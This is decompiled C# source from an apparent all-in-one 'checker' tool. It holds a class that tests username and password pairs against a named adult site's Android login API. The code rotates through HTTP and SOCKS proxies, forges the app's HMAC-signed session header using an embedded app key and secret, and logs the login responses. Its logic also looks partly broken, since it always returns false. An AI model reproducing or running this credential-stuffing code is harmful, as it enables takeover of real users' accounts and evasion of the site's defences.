// Decompiled with JetBrains decompiler
// Type: EvolutionAIO.Checkers.Pornhub
// Assembly: EvolutionAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FFBD76CC-A7A1-4682-B132-DAECA7C9FD32
// Assembly location: C:\Users\Pc\Downloads\Evolutionv2\EvolutionAIO.exe

using Leaf.xNet;
using System;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;

namespace EvolutionAIO.Checkers
{
  internal class Pornhub
  {
    public static bool check(string[] s, string proxy)
    {
      if (0 >= Config.config.retries + 1)
        return false;
      try
      {
        using (HttpRequest httpRequest = new HttpRequest())
        {
          proxy = Menu.proxies.ElementAt<string>(new Random().Next(Menu.proxiesCount));
          if (Menu.proxyProtocol == "HTTP")
            httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
          if (Menu.proxyProtocol == "SOCKS4")
            httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
          if (Menu.proxyProtocol == "SOCKS5")
            httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
          httpRequest.IgnoreProtocolErrors = true;
          string str1 = Pornhub.uuidn();
          byte[] bytes1 = Encoding.UTF8.GetBytes("appKey=72d2512a43364263e9d94f0f73&uuid=" + str1 + "username=" + s[0] + "&password=" + s[1]);
          byte[] bytes2 = Encoding.UTF8.GetBytes("+KbPeShVmYq3t6w9z$C&F)J@McQfTjWn");
          string s1 = "";
          using (HMACSHA256 hmacshA256 = new HMACSHA256(bytes2))
            s1 = Convert.ToBase64String(hmacshA256.ComputeHash(bytes1));
          Save.AsResult(nameof (Pornhub), "RInpute", str1 + " ~ " + s1 + " ~ " + Convert.ToBase64String(Encoding.UTF8.GetBytes(s1)));
          httpRequest.AddHeader("User-Agent", "okhttp/4.0.0");
          httpRequest.AddHeader("Session-Seed", Convert.ToBase64String(Encoding.UTF8.GetBytes(s1)));
          string str2 = "username=" + s[0] + "&password=" + s[1];
          httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
          HttpResponse httpResponse = httpRequest.Post("https://api.pornhub.com/android/login?appKey=72d2512a43364263e9d94f0f73&uuid=" + str1, str2, "application/json");
          Save.AsResult(nameof (Pornhub), "R", httpResponse.ToString());
          if (httpResponse.ToString().Contains("Invalid username or password"))
            return false;
        }
      }
      catch (Exception ex)
      {
        if (ex.ToString().Contains("Index was outside the bounds of the array"))
          return false;
        Save.AsResult(nameof (Pornhub), "Errors", ex.ToString());
        ++Menu.errors;
      }
      return false;
    }

    private static string uuidn() => Menu.RandomDigit(2) + Menu.RandomChar(1) + Menu.RandomDigit(6) + Menu.RandomChar(2) + Menu.RandomDigit(5);
  }
}
